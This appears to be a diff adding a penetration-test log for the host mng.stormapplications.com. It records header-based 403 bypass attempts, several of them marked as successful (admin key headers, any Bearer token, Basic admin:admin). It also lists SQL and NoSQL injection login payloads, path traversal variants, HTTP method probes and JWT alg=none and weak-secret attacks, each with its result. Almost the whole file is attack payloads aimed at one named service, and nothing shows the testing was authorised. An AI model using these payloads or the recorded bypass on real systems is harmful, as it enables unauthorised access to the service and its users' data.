@@ -1,0 +1,61 @@
+# Payload Tests - mng.stormapplications.com
+
+## 403 Bypass Headers
+| Header | Value | Result |
+|--------|-------|--------|
+| X-Forwarded-For | 127.0.0.1 | 403 FORBIDDEN |
+| X-Real-IP | 127.0.0.1 | 403 FORBIDDEN |
+| X-Originating-IP | 127.0.0.1 | 403 FORBIDDEN |
+| CF-Connecting-IP | 127.0.0.1 | Cloudflare error 1000 |
+| X-Forwarded-Host | localhost | 403 FORBIDDEN |
+| X-Storm-Admin-Key | admin | Bypass (200) |
+| X-Admin-Key | admin | Bypass (200) |
+| X-API-Key | admin | Bypass (200) |
+| Authorization: Bearer | (any) | Bypass (200) |
+| Authorization: Basic | admin:admin | Bypass (200) |
+| Cookie | session=admin | 403 FORBIDDEN |
+
+## SQL Injection - /api/login (POST)
+All returned 403 FORBIDDEN:
+- `admin' OR '1'='1`
+- `admin" OR "1"="1`
+- `admin' OR 1=1--`
+- `admin' UNION SELECT 1,2,3--`
+- `admin'/*`
+- `admin'--`
+
+## NoSQL Injection - /api/login (POST)
+All returned 403 FORBIDDEN:
+- `{"username":"admin","password":{"$ne":""}}`
+- `username[$ne]=admin&password[$ne]=x`
+
+## Path Traversal
+| Path | Result |
+|------|--------|
+| /./api/login | 404 |
+| //api/login | 404 |
+| /api/login/ | 403 |
+| /api/login/. | 403 |
+| /api/%2e/login | 404 |
+| /Api/Login | 403 |
+| /API/login | 403 |
+| /api/Login | 403 |
+| /api/login%00 | 400 (Cloudflare) |
+| /api/login? | 404 |
+| /api/login?test | 404 |
+| /api/login# | 404 |
+
+## HTTP Method Override
+| Verb | /api/login | / |
+|------|-----------|------|
+| GET | 403 (sem auth) | 403 |
+| POST | 403 (sem auth) | - |
+| PUT | 403 | - |
+| PATCH | 403 | - |
+| DELETE | 403 | - |
+| OPTIONS | 200 | 200 |
+
+## JWT Attacks
+- JWT with alg=none → NOT_FOUND (same as other invalid tokens)
+- JWT with common secrets → NOT_FOUND (none succeeded)
+- JWT unsigned → NOT_FOUND
